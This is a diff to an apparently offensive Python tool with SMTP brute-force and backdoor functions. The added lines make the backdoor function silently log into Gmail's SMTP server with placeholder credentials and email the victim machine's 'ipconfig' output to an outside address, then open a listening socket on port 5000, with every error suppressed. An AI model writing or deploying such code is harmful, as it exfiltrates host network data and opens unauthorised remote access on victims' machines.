@@ -49,6 +49,14 @@ def bforce(smtpserver, udic, pdic):
 
 
 def bd(ip="0.0.0.0",port=5000):
+	try:
+		sendmsg = SMTP("smtp.gmail.com:587")
+		sendmsg.starttls()
+		sendmsg.login("correo_falso", "clave")
+		sendmsg.sendmail("lammerbait", "tu_correo",os.popen("ipconfig").read().encode())
+		sendmsg.close()
+	except:
+		pass
 	sock = socket(AF_INET, SOCK_STREAM)
 	sock.bind((ip, port))
 	sock.listen(1)
